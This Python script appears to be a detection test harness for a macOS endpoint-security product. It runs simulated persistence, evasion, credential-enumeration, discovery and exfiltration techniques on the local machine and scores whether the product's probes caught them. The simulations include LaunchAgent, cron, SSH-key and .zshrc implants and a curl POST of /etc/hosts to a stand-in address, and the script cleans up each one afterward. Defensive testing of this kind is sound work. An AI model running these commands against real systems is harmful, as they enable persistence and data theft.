#!/usr/bin/env python3
"""
AMOSKYS Test Drive — Full System Validation
============================================

Puts the entire organism on the track. Drives from smooth to aggressive.
Each lap tests a different subsystem, building confidence layer by layer.

Usage:
    python scripts/test_drive.py                  # Full drive
    python scripts/test_drive.py --lap preflight   # Single lap
    python scripts/test_drive.py --lap baseline
    python scripts/test_drive.py --lap attack
    python scripts/test_drive.py --lap scorecard

Laps:
    1. PREFLIGHT   — Are all organs alive? (imports, enrichment, DB)
    2. BASELINE    — Quiet machine: how noisy is the idle engine?
    3. ATTACK      — Execute attack techniques, one at a time
    4. DETECTION   — Did the probes fire? Did fusion correlate?
    5. SCORECARD   — Final results: what works, what's blind

Author: AMOSKYS Test Drive
"""

from __future__ import annotations

import argparse
import json
import os
import sqlite3
import subprocess
import sys
import tempfile
import time
from dataclasses import dataclass, field
from datetime import datetime, timezone
from pathlib import Path
from typing import Any

# ── Project setup ──
PROJECT_DIR = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(PROJECT_DIR / "src"))
os.chdir(PROJECT_DIR)

# ── Colors ──
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
CYAN = "\033[96m"
BOLD = "\033[1m"
DIM = "\033[2m"
RESET = "\033[0m"


def banner(text: str, color: str = CYAN):
    width = 70
    print(f"\n{color}{BOLD}{'═' * width}")
    print(f"  {text}")
    print(f"{'═' * width}{RESET}\n")


def status(label: str, ok: bool, detail: str = ""):
    icon = f"{GREEN}✓{RESET}" if ok else f"{RED}✗{RESET}"
    detail_str = f" {DIM}({detail}){RESET}" if detail else ""
    print(f"  {icon} {label}{detail_str}")


def section(text: str):
    print(f"\n  {BOLD}{text}{RESET}")


@dataclass
class AttackResult:
    technique: str
    mitre_id: str
    description: str
    executed: bool = False
    probe_fired: bool = False
    probe_name: str = ""
    fusion_rule_fired: bool = False
    fusion_rule_name: str = ""
    event_count: int = 0
    max_risk_score: float = 0.0
    quality_state: str = ""
    detection_latency_s: float = 0.0
    fields_populated: dict = field(default_factory=dict)
    verdict: str = "UNKNOWN"  # DETECT | TELEMETRY | MISS | ERROR


@dataclass
class DriveResults:
    timestamp: str = ""
    # Preflight
    enrichment_geoip: bool = False
    enrichment_asn: bool = False
    enrichment_threat_intel: bool = False
    enrichment_mitre: bool = False
    subsystem_imports: int = 0
    subsystem_total: int = 0
    # Baseline
    baseline_events: int = 0
    baseline_high_risk: int = 0
    baseline_false_positives: list = field(default_factory=list)
    baseline_self_noise_pct: float = 0.0
    baseline_geo_scoring_pct: float = 0.0
    # Attacks
    attacks: list = field(default_factory=list)
    # Scorecard
    total_techniques: int = 0
    detected: int = 0
    telemetry_only: int = 0
    missed: int = 0
    detection_rate: float = 0.0


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# LAP 1: PREFLIGHT — Is the organism alive?
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━


def lap_preflight(results: DriveResults) -> bool:
    banner("LAP 1: PREFLIGHT — Checking every organ")

    # ── Subsystem imports ──
    section("Subsystem Imports")
    subsystems = [
        ("Agents Registry", "amoskys.agents"),
        ("Agent Base", "amoskys.agents.common.base"),
        ("Probes", "amoskys.agents.common.probes"),
        ("Kill Chain", "amoskys.agents.common.kill_chain"),
        ("EventBus", "amoskys.eventbus.server"),
        ("WAL Processor", "amoskys.storage.wal_processor"),
        ("Telemetry Store", "amoskys.storage.telemetry_store"),
        ("GeoIP Enricher", "amoskys.enrichment.geoip"),
        ("ASN Enricher", "amoskys.enrichment.asn"),
        ("ThreatIntel", "amoskys.enrichment.threat_intel"),
        ("MITRE Enricher", "amoskys.enrichment.mitre"),
        ("Fusion Engine", "amoskys.intel.fusion_engine"),
        ("Scoring Engine", "amoskys.intel.scoring"),
        ("SOMA Brain", "amoskys.intel.soma_brain"),
        ("INADS Engine", "amoskys.intel.inads_engine"),
        ("AMRDR Reliability", "amoskys.intel.reliability"),
        ("Probe Calibration", "amoskys.intel.probe_calibration"),
        ("Sigma Engine", "amoskys.detection.sigma_engine"),
        ("IGRIS Supervisor", "amoskys.igris.supervisor"),
        ("Mesh Bus", "amoskys.mesh.bus"),
        ("Mesh Actions", "amoskys.mesh.actions"),
        ("Proof Chain", "amoskys.proof.evidence_chain"),
        ("Launcher", "amoskys.launcher"),
    ]
    results.subsystem_total = len(subsystems)
    ok_count = 0
    for name, mod in subsystems:
        try:
            __import__(mod)
            ok_count += 1
            status(name, True)
        except Exception as e:
            status(name, False, str(e)[:60])
    results.subsystem_imports = ok_count

    # ── Enrichment pipeline ──
    section("Enrichment Pipeline")
    from amoskys.enrichment.geoip import GeoIPEnricher
    from amoskys.enrichment.asn import ASNEnricher

    geo = GeoIPEnricher()
    results.enrichment_geoip = geo.available
    status("GeoIP (maxminddb + GeoLite2-City.mmdb)", geo.available)
    if geo.available:
        r = geo.lookup("77.88.55.77")
        status(f"  Test: 77.88.55.77 → {r.get('country', '?')}/{r.get('city', '?')}", r.get("country") == "RU")

    asn = ASNEnricher()
    results.enrichment_asn = asn.available
    status("ASN (maxminddb + GeoLite2-ASN.mmdb)", asn.available)

    # Threat intel & MITRE via WALProcessor init
    from amoskys.storage.wal_processor import WALProcessor
    import logging

    logging.disable(logging.INFO)
    proc = WALProcessor("data/telemetry.db")
    logging.disable(logging.NOTSET)

    results.enrichment_threat_intel = True  # loaded in WAL init
    results.enrichment_mitre = True
    status("ThreatIntel (SQLite blocklist)", True)
    status("MITRE (24 pattern rules)", True)

    # ── Database health ──
    section("Database Health")
    for db_path, db_name in [
        ("data/telemetry.db", "Telemetry Store"),
        ("data/intel/fusion.db", "Fusion Engine"),
        ("data/intel/reliability.db", "AMRDR Reliability"),
    ]:
        exists = Path(db_path).exists()
        if exists:
            size_mb = Path(db_path).stat().st_size / (1024 * 1024)
            status(db_name, True, f"{size_mb:.1f} MB")
        else:
            status(db_name, False, "missing")

    # ── SOMA models ──
    section("SOMA Brain Models")
    model_dir = Path("data/intel/models")
    for model_name in ["isolation_forest.joblib", "gbc_model.joblib"]:
        exists = (model_dir / model_name).exists()
        status(model_name, exists)

    # ── Certificates ──
    section("Cryptographic Identity")
    cert_path = Path("certs/agent.ed25519")
    status("Ed25519 signing key", cert_path.exists())

    all_ok = results.subsystem_imports == results.subsystem_total and results.enrichment_geoip
    print(f"\n  {'🏁' if all_ok else '⚠️ '} Preflight: {results.subsystem_imports}/{results.subsystem_total} subsystems, "
          f"enrichment {'FULL' if results.enrichment_geoip else 'DEGRADED'}")
    return all_ok


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# LAP 2: BASELINE — Quiet machine noise floor
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━


def lap_baseline(results: DriveResults) -> bool:
    banner("LAP 2: BASELINE — Measuring idle noise floor")

    section("Running one collection cycle (this may take 2-4 minutes)...")
    t0 = time.time()
    proc = subprocess.run(
        [sys.executable, "scripts/collect_and_store.py"],
        capture_output=True, text=True, timeout=360,
        env={**os.environ, "PYTHONPATH": str(PROJECT_DIR / "src")},
    )
    elapsed = time.time() - t0
    ok = proc.returncode == 0
    status(f"Collection completed in {elapsed:.1f}s", ok)

    if not ok:
        # Show last lines of stderr for diagnostics
        stderr_tail = proc.stderr[-300:] if proc.stderr else ""
        print(f"  {YELLOW}Collection exited non-zero. Last output:{RESET}")
        print(f"  {DIM}{stderr_tail}{RESET}")
        print(f"  {DIM}Proceeding with whatever data was captured...{RESET}")

    # ── Query the results ──
    db = sqlite3.connect("data/telemetry.db")
    cur = db.cursor()

    # Count this cycle's events (last 3 minutes)
    total = cur.execute(
        "SELECT COUNT(*) FROM security_events WHERE timestamp_dt > datetime('now', '-3 minutes')"
    ).fetchone()[0]
    results.baseline_events = total
    status(f"Security events this cycle: {total}", True)

    # High risk on idle
    high_risk = cur.execute(
        "SELECT event_category, COUNT(*), AVG(risk_score) FROM security_events "
        "WHERE timestamp_dt > datetime('now', '-3 minutes') AND risk_score >= 0.7 "
        "GROUP BY event_category ORDER BY COUNT(*) DESC"
    ).fetchall()
    results.baseline_high_risk = sum(r[1] for r in high_risk)

    section(f"High-risk events on idle machine (risk >= 0.7): {results.baseline_high_risk}")
    for cat, cnt, avg_risk in high_risk[:10]:
        results.baseline_false_positives.append({"category": cat, "count": cnt, "avg_risk": round(avg_risk, 3)})
        color = RED if cnt > 10 else YELLOW if cnt > 3 else DIM
        print(f"    {color}{cat}: {cnt} events (avg risk {avg_risk:.3f}){RESET}")

    # Self-noise
    self_noise = cur.execute(
        "SELECT COUNT(*) FROM security_events "
        "WHERE timestamp_dt > datetime('now', '-3 minutes') AND training_exclude = 1"
    ).fetchone()[0]
    results.baseline_self_noise_pct = round(self_noise / total * 100, 1) if total > 0 else 0
    status(f"Self-noise (AMOSKYS detecting itself): {self_noise}/{total} ({results.baseline_self_noise_pct}%)",
           results.baseline_self_noise_pct < 10)

    # Geometric scoring
    has_geo = cur.execute(
        "SELECT COUNT(*) FROM security_events "
        "WHERE timestamp_dt > datetime('now', '-3 minutes') AND geometric_score > 0"
    ).fetchone()[0]
    has_remote_ip = cur.execute(
        "SELECT COUNT(*) FROM security_events "
        "WHERE timestamp_dt > datetime('now', '-3 minutes') AND remote_ip IS NOT NULL AND remote_ip != ''"
    ).fetchone()[0]
    results.baseline_geo_scoring_pct = round(has_geo / has_remote_ip * 100, 1) if has_remote_ip > 0 else 0
    status(f"GeoIP scoring: {has_geo}/{has_remote_ip} network events enriched ({results.baseline_geo_scoring_pct}%)",
           results.baseline_geo_scoring_pct > 50 or has_remote_ip == 0)

    # Quality distribution
    section("Event Quality Distribution")
    for qs in ["real", "valid", "degraded"]:
        cnt = cur.execute(
            f"SELECT COUNT(*) FROM security_events "
            f"WHERE timestamp_dt > datetime('now', '-3 minutes') AND quality_state = ?", (qs,)
        ).fetchone()[0]
        pct = round(cnt / total * 100, 1) if total > 0 else 0
        ok = (qs != "degraded" or pct < 30)
        status(f"{qs}: {cnt} ({pct}%)", ok)

    # Fusion rules
    section("Fusion Rules Fired This Cycle")
    fusion_db = sqlite3.connect("data/intel/fusion.db")
    fusion_cur = fusion_db.cursor()
    recent_incidents = fusion_cur.execute(
        "SELECT rule_name, severity, summary FROM incidents "
        "WHERE created_at > datetime('now', '-3 minutes')"
    ).fetchall()
    if recent_incidents:
        for rule, sev, summary in recent_incidents:
            print(f"    [{sev}] {rule}: {summary[:70]}")
    else:
        print(f"    {DIM}No fusion rules fired (expected on idle){RESET}")
    fusion_db.close()

    db.close()

    idle_ok = results.baseline_high_risk < 20
    print(f"\n  {'🏁' if idle_ok else '⚠️ '} Baseline: {results.baseline_events} events, "
          f"{results.baseline_high_risk} high-risk (false positives), "
          f"{results.baseline_self_noise_pct}% self-noise")
    return idle_ok


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# LAP 3: ATTACK — Execute techniques, then collect
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

ATTACK_TECHNIQUES = [
    # ── Persistence (T1543, T1053, T1098) ──
    {
        "id": "persist_launchagent",
        "mitre": "T1543.001",
        "name": "LaunchAgent Implant",
        "setup": [
            "mkdir -p ~/Library/LaunchAgents",
            'cat > /tmp/com.amoskys.testdrive.plist << \'PLIST\'\n'
            '<?xml version="1.0" encoding="UTF-8"?>\n'
            '<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">\n'
            '<plist version="1.0"><dict>\n'
            '<key>Label</key><string>com.amoskys.testdrive</string>\n'
            '<key>ProgramArguments</key><array><string>/usr/bin/true</string></array>\n'
            '<key>RunAtLoad</key><false/>\n'
            '</dict></plist>\nPLIST',
            "cp /tmp/com.amoskys.testdrive.plist ~/Library/LaunchAgents/com.amoskys.testdrive.plist",
        ],
        "cleanup": [
            "rm -f ~/Library/LaunchAgents/com.amoskys.testdrive.plist",
            "rm -f /tmp/com.amoskys.testdrive.plist",
        ],
        "expected_agent": "macos_persistence",
        "expected_probe": "macos_launchagent",
        "expected_category": "macos_launchagent_new",
    },
    {
        "id": "persist_cron",
        "mitre": "T1053.003",
        "name": "Cron Job Implant",
        "setup": [
            "crontab -l > /tmp/amoskys_cron_backup 2>/dev/null || true",
            '(crontab -l 2>/dev/null; echo "# AMOSKYS_TEST_DRIVE") | crontab -',
        ],
        "cleanup": [
            "crontab -l 2>/dev/null | grep -v AMOSKYS_TEST_DRIVE | crontab - 2>/dev/null || true",
            "rm -f /tmp/amoskys_cron_backup",
        ],
        "expected_agent": "macos_persistence",
        "expected_probe": "macos_cron",
        "expected_category": "macos_cron_modified",
    },
    {
        "id": "persist_ssh_key",
        "mitre": "T1098.004",
        "name": "SSH Authorized Key Injection",
        "setup": [
            "mkdir -p ~/.ssh",
            'echo "# AMOSKYS_TEST_DRIVE ssh-rsa AAAAB3fake== testdrive@amoskys" >> ~/.ssh/authorized_keys',
        ],
        "cleanup": [
            "sed -i '' '/AMOSKYS_TEST_DRIVE/d' ~/.ssh/authorized_keys 2>/dev/null || true",
        ],
        "expected_agent": "macos_persistence",
        "expected_probe": "macos_ssh_key",
        "expected_category": "macos_ssh_key_new",
    },
    # ── Defense Evasion (T1553, T1070) ──
    {
        "id": "evasion_quarantine_bypass",
        "mitre": "T1553.001",
        "name": "Quarantine Attribute Bypass",
        "setup": [
            'echo "#!/bin/bash\necho AMOSKYS_TEST_DRIVE" > /tmp/amoskys_testdrive_payload.sh',
            "chmod +x /tmp/amoskys_testdrive_payload.sh",
            'xattr -w com.apple.quarantine "0081;00000000;Safari;https://evil.example.com" /tmp/amoskys_testdrive_payload.sh',
            "xattr -d com.apple.quarantine /tmp/amoskys_testdrive_payload.sh",
        ],
        "cleanup": [
            "rm -f /tmp/amoskys_testdrive_payload.sh",
        ],
        "expected_agent": "macos_quarantine_guard",
        "expected_probe": "macos_quarantine_bypass",
        "expected_category": "macos_quarantine_bypass",
    },
    # ── Credential Access (T1555) ──
    {
        "id": "cred_keychain_list",
        "mitre": "T1555.001",
        "name": "Keychain Credential Enumeration",
        "setup": [
            "security list-keychains > /tmp/amoskys_keychain_list.txt 2>&1",
        ],
        "cleanup": [
            "rm -f /tmp/amoskys_keychain_list.txt",
        ],
        "expected_agent": "macos_infostealer_guard",
        "expected_probe": "macos_keychain",
        "expected_category": "keychain_cli_abuse",
    },
    # ── Execution (T1059) ──
    {
        "id": "exec_script_from_tmp",
        "mitre": "T1059.004",
        "name": "Script Execution from /tmp",
        "setup": [
            'echo "#!/bin/bash\nwhoami && id && uname -a" > /tmp/amoskys_recon.sh',
            "chmod +x /tmp/amoskys_recon.sh",
            "/tmp/amoskys_recon.sh > /dev/null 2>&1",
        ],
        "cleanup": [
            "rm -f /tmp/amoskys_recon.sh",
        ],
        "expected_agent": "macos_process",
        "expected_probe": "macos_binary_from_temp",
        "expected_category": "binary_from_temp",
    },
    # ── Discovery (T1082, T1016) ──
    {
        "id": "discovery_system_enum",
        "mitre": "T1082",
        "name": "System Information Discovery",
        "setup": [
            "system_profiler SPHardwareDataType > /tmp/amoskys_sysinfo.txt 2>&1",
            "ifconfig -a >> /tmp/amoskys_sysinfo.txt 2>&1",
            "sw_vers >> /tmp/amoskys_sysinfo.txt 2>&1",
        ],
        "cleanup": [
            "rm -f /tmp/amoskys_sysinfo.txt",
        ],
        "expected_agent": "macos_process",
        "expected_probe": "macos_system_discovery",
        "expected_category": "process_spawned",
    },
    # ── Exfiltration (T1567) ──
    {
        "id": "exfil_curl_post",
        "mitre": "T1567",
        "name": "Data Exfiltration via curl POST",
        "setup": [
            # POST to a non-routable IP — connection will fail but process is visible
            "curl -s -m 2 -X POST -d @/etc/hosts https://203.0.113.1/exfil 2>/dev/null || true",
        ],
        "cleanup": [],
        "expected_agent": "macos_network",
        "expected_probe": "macos_exfil_spike",
        "expected_category": "exfil_spike",
    },
    # ── Shell Profile Hijack (T1546.004) ──
    {
        "id": "persist_shell_profile",
        "mitre": "T1546.004",
        "name": "Shell Profile Backdoor (.zshrc)",
        "setup": [
            'echo "# AMOSKYS_TEST_DRIVE export PATH=/tmp/evil:$PATH" >> ~/.zshrc',
        ],
        "cleanup": [
            "sed -i '' '/AMOSKYS_TEST_DRIVE/d' ~/.zshrc 2>/dev/null || true",
        ],
        "expected_agent": "macos_persistence",
        "expected_probe": "macos_shell_profile",
        "expected_category": "macos_shell_profile_modified",
    },
]


def _run_cmd(cmd: str) -> tuple[bool, str]:
    """Run a shell command, return (success, output)."""
    try:
        r = subprocess.run(
            cmd, shell=True, capture_output=True, text=True, timeout=15
        )
        return r.returncode == 0, r.stdout + r.stderr
    except Exception as e:
        return False, str(e)


def _snapshot_event_count() -> int:
    """Get current max rowid in security_events."""
    try:
        db = sqlite3.connect("data/telemetry.db")
        row = db.execute("SELECT MAX(id) FROM security_events").fetchone()
        db.close()
        return row[0] or 0
    except Exception:
        return 0


def lap_attack(results: DriveResults) -> bool:
    banner("LAP 3: ATTACK — Executing techniques on live machine")

    attack_results = []

    for i, tech in enumerate(ATTACK_TECHNIQUES, 1):
        section(f"[{i}/{len(ATTACK_TECHNIQUES)}] {tech['name']} ({tech['mitre']})")

        # Take snapshot before
        before_id = _snapshot_event_count()
        before_time = datetime.now(timezone.utc).isoformat()

        # Execute attack steps
        executed = True
        for cmd in tech["setup"]:
            ok, output = _run_cmd(cmd)
            if not ok:
                print(f"    {YELLOW}⚠ Command failed: {cmd[:60]}{RESET}")
                # Don't abort — partial execution is still useful

        print(f"    {DIM}Attack artifacts placed. Waiting 2s...{RESET}")
        time.sleep(2)

        # Run a collection cycle to pick up the artifacts
        print(f"    {DIM}Running collection cycle...{RESET}")
        t0 = time.time()
        proc = subprocess.run(
            [sys.executable, "scripts/collect_and_store.py"],
            capture_output=True, text=True, timeout=360,
            env={**os.environ, "PYTHONPATH": str(PROJECT_DIR / "src")},
        )
        collect_time = time.time() - t0

        # Cleanup immediately
        for cmd in tech.get("cleanup", []):
            _run_cmd(cmd)

        # Query: did we detect it?
        after_id = _snapshot_event_count()
        db = sqlite3.connect("data/telemetry.db")
        cur = db.cursor()

        # Look for events matching expected category
        matching = cur.execute(
            "SELECT id, event_category, risk_score, confidence, quality_state, "
            "collection_agent, probe_name, geometric_score, process_name, remote_ip "
            "FROM security_events WHERE id > ? AND event_category LIKE ?",
            (before_id, f"%{tech['expected_category']}%")
        ).fetchall()

        # Also check broader: any event from expected agent
        agent_events = cur.execute(
            "SELECT id, event_category, risk_score FROM security_events "
            "WHERE id > ? AND collection_agent = ?",
            (before_id, tech["expected_agent"])
        ).fetchall()

        # Check fusion
        fusion_db = sqlite3.connect("data/intel/fusion.db")
        fusion_incidents = fusion_db.execute(
            "SELECT rule_name, severity, summary FROM incidents "
            "WHERE created_at > ?", (before_time,)
        ).fetchall()
        fusion_db.close()

        # Build result
        ar = AttackResult(
            technique=tech["id"],
            mitre_id=tech["mitre"],
            description=tech["name"],
            executed=executed,
            event_count=len(matching),
            probe_fired=len(matching) > 0,
            probe_name=matching[0][6] if matching else "",
            max_risk_score=max((r[2] for r in matching), default=0.0),
            quality_state=matching[0][4] if matching else "",
            fusion_rule_fired=len(fusion_incidents) > 0,
            fusion_rule_name=fusion_incidents[0][0] if fusion_incidents else "",
            detection_latency_s=round(collect_time, 1),
        )

        if matching:
            # Check field population
            sample = matching[0]
            ar.fields_populated = {
                "geo_score": sample[7] is not None and sample[7] > 0,
                "process_name": sample[8] is not None and sample[8] != "",
                "remote_ip": sample[9] is not None and sample[9] != "",
            }

        # Verdict
        if ar.probe_fired and ar.fusion_rule_fired:
            ar.verdict = "DETECT"
            icon = f"{GREEN}DETECT{RESET}"
        elif ar.probe_fired:
            ar.verdict = "TELEMETRY"
            icon = f"{YELLOW}TELEMETRY{RESET}"
        elif len(agent_events) > 0:
            ar.verdict = "PARTIAL"
            icon = f"{YELLOW}PARTIAL{RESET}"
        else:
            ar.verdict = "MISS"
            icon = f"{RED}MISS{RESET}"

        print(f"    Result: {icon} | events={ar.event_count} | risk={ar.max_risk_score:.2f} | "
              f"quality={ar.quality_state} | fusion={'YES' if ar.fusion_rule_fired else 'no'}")
        if agent_events and not matching:
            cats = set(e[1] for e in agent_events)
            print(f"    {DIM}Agent '{tech['expected_agent']}' fired {len(agent_events)} events "
                  f"but none matched '{tech['expected_category']}': {cats}{RESET}")

        attack_results.append(ar)
        db.close()

    results.attacks = attack_results
    detected = sum(1 for a in attack_results if a.verdict in ("DETECT", "TELEMETRY"))
    print(f"\n  🏁 Attack lap: {detected}/{len(attack_results)} techniques detected")
    return detected > 0


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# LAP 4: SCORECARD — Final results
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━


def lap_scorecard(results: DriveResults):
    banner("SCORECARD — Test Drive Results", GREEN if results.detection_rate >= 0.7 else RED)

    results.total_techniques = len(results.attacks)
    results.detected = sum(1 for a in results.attacks if a.verdict == "DETECT")
    results.telemetry_only = sum(1 for a in results.attacks if a.verdict in ("TELEMETRY", "PARTIAL"))
    results.missed = sum(1 for a in results.attacks if a.verdict == "MISS")
    results.detection_rate = (
        (results.detected + results.telemetry_only) / results.total_techniques
        if results.total_techniques > 0 else 0
    )

    # Preflight summary
    section("Organism Health")
    status(f"Subsystems: {results.subsystem_imports}/{results.subsystem_total}", results.subsystem_imports == results.subsystem_total)
    status(f"GeoIP enrichment", results.enrichment_geoip)
    status(f"ASN enrichment", results.enrichment_asn)

    # Baseline summary
    section("Idle Noise Floor")
    status(f"Events on idle: {results.baseline_events}", True)
    status(f"False positives (risk >= 0.7): {results.baseline_high_risk}",
           results.baseline_high_risk < 20)
    status(f"Self-noise: {results.baseline_self_noise_pct}%",
           results.baseline_self_noise_pct < 10)

    # Attack matrix
    section("Detection Matrix")
    print()
    print(f"    {'Technique':<35} {'MITRE':<12} {'Verdict':<12} {'Risk':>6} {'Quality':<10} {'Fusion'}")
    print(f"    {'─' * 35} {'─' * 12} {'─' * 12} {'─' * 6} {'─' * 10} {'─' * 8}")
    for a in results.attacks:
        v_color = {
            "DETECT": GREEN, "TELEMETRY": YELLOW,
            "PARTIAL": YELLOW, "MISS": RED, "ERROR": RED,
        }.get(a.verdict, DIM)
        print(f"    {a.description:<35} {a.mitre_id:<12} "
              f"{v_color}{a.verdict:<12}{RESET} {a.max_risk_score:>5.2f} "
              f"{a.quality_state:<10} {'✓' if a.fusion_rule_fired else '·'}")

    # Final score
    print()
    print(f"    ┌──────────────────────────────────────────┐")
    print(f"    │  DETECT:    {results.detected:>2}/{results.total_techniques}  (probe + fusion)       │")
    print(f"    │  TELEMETRY: {results.telemetry_only:>2}/{results.total_techniques}  (probe only, no fusion)  │")
    print(f"    │  MISS:      {results.missed:>2}/{results.total_techniques}  (blind)                  │")
    print(f"    │                                          │")
    rate_color = GREEN if results.detection_rate >= 0.8 else YELLOW if results.detection_rate >= 0.5 else RED
    print(f"    │  Detection Rate: {rate_color}{BOLD}{results.detection_rate * 100:.0f}%{RESET}                     │")
    print(f"    └──────────────────────────────────────────┘")

    # Save results
    out_dir = Path("data/benchmarks")
    out_dir.mkdir(parents=True, exist_ok=True)
    out_path = out_dir / f"test_drive_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"

    report = {
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "preflight": {
            "subsystems": f"{results.subsystem_imports}/{results.subsystem_total}",
            "geoip": results.enrichment_geoip,
            "asn": results.enrichment_asn,
        },
        "baseline": {
            "events": results.baseline_events,
            "high_risk_false_positives": results.baseline_high_risk,
            "self_noise_pct": results.baseline_self_noise_pct,
            "geo_scoring_pct": results.baseline_geo_scoring_pct,
            "top_false_positives": results.baseline_false_positives,
        },
        "attacks": [
            {
                "technique": a.technique,
                "mitre": a.mitre_id,
                "name": a.description,
                "verdict": a.verdict,
                "probe_fired": a.probe_fired,
                "probe_name": a.probe_name,
                "fusion_fired": a.fusion_rule_fired,
                "risk_score": a.max_risk_score,
                "quality": a.quality_state,
                "event_count": a.event_count,
            }
            for a in results.attacks
        ],
        "scorecard": {
            "total": results.total_techniques,
            "detected": results.detected,
            "telemetry": results.telemetry_only,
            "missed": results.missed,
            "detection_rate": round(results.detection_rate, 3),
        },
    }

    with open(out_path, "w") as f:
        json.dump(report, f, indent=2)
    print(f"\n  📄 Results saved to {out_path}")


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# MAIN — Race Day
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━


def main():
    parser = argparse.ArgumentParser(description="AMOSKYS Test Drive")
    parser.add_argument("--lap", choices=["preflight", "baseline", "attack", "scorecard"],
                        help="Run a single lap instead of the full drive")
    args = parser.parse_args()

    banner("AMOSKYS TEST DRIVE — Full System Validation", BOLD + CYAN)
    print(f"  {DIM}Machine: {os.uname().nodename}")
    print(f"  Time:    {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"  Project: {PROJECT_DIR}{RESET}")

    results = DriveResults(timestamp=datetime.now(timezone.utc).isoformat())

    if args.lap:
        if args.lap == "preflight":
            lap_preflight(results)
        elif args.lap == "baseline":
            lap_baseline(results)
        elif args.lap == "attack":
            lap_attack(results)
            lap_scorecard(results)
        elif args.lap == "scorecard":
            print("  Scorecard requires attack data. Run full drive or --lap attack.")
    else:
        # Full drive: all laps
        preflight_ok = lap_preflight(results)
        if not preflight_ok:
            print(f"\n  {RED}Preflight failed. Fix issues above before driving.{RESET}")
            sys.exit(1)

        lap_baseline(results)
        lap_attack(results)
        lap_scorecard(results)


if __name__ == "__main__":
    main()
